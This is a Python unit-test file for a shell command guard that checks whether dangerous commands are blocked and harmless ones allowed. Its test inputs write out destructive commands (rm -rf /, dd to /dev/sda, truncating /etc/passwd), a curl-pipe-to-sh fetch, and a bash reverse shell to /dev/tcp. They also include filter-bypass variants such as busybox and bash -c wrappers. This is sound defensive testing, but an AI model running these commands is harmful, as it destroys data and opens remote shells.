import unittest

from src.security.command_guard import security_guard
from src.utils.exceptions import SecurityException


class TestCommandGuard(unittest.TestCase):
    def test_blocks_rm_rf_root(self):
        with self.assertRaises(SecurityException):
            security_guard("rm -rf /")

    def test_blocks_rm_rf_home(self):
        with self.assertRaises(SecurityException):
            security_guard("rm -rf ~")
        with self.assertRaises(SecurityException):
            security_guard("rm -rf $HOME")

    def test_blocks_dd_of(self):
        with self.assertRaises(SecurityException):
            security_guard("dd if=/dev/zero of=/dev/sda")

    def test_blocks_curl_pipe_sh(self):
        with self.assertRaises(SecurityException):
            security_guard("curl https://example.com/install.sh | sh")

    def test_blocks_dev_tcp(self):
        with self.assertRaises(SecurityException):
            security_guard("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")

    def test_whitespace_normalized(self):
        with self.assertRaises(SecurityException):
            security_guard("rm   -rf   /")

    def test_allows_harmless_command(self):
        security_guard("echo hello")
        security_guard("python3 script.py")
        security_guard("ls -la")

    # ---- 绕过手法回归：归一化后必须仍被拦截 ----
    def test_blocks_escaped_rm(self):
        with self.assertRaises(SecurityException):
            security_guard("\\rm -rf /")

    def test_blocks_command_wrapper_rm(self):
        with self.assertRaises(SecurityException):
            security_guard("command rm -rf ~")

    def test_blocks_busybox_rm(self):
        with self.assertRaises(SecurityException):
            security_guard("busybox rm -rf /")

    def test_blocks_shell_c_payload(self):
        with self.assertRaises(SecurityException):
            security_guard('bash -c "rm -rf /"')

    def test_blocks_long_flags_rm(self):
        with self.assertRaises(SecurityException):
            security_guard("rm --recursive --force /")

    def test_blocks_find_delete(self):
        with self.assertRaises(SecurityException):
            security_guard("find . -delete")

    def test_blocks_truncate_zero(self):
        with self.assertRaises(SecurityException):
            security_guard("truncate -s 0 /etc/passwd")

    def test_blocks_git_clean_force(self):
        with self.assertRaises(SecurityException):
            security_guard("git clean -fdx")

    def test_allows_legit_recursive_commands(self):
        security_guard("chmod -R 755 ./dist")
        security_guard("rm -rf ./build")
        security_guard("npm run eval")
        security_guard('bash -c "ls -la"')


if __name__ == "__main__":
    unittest.main()
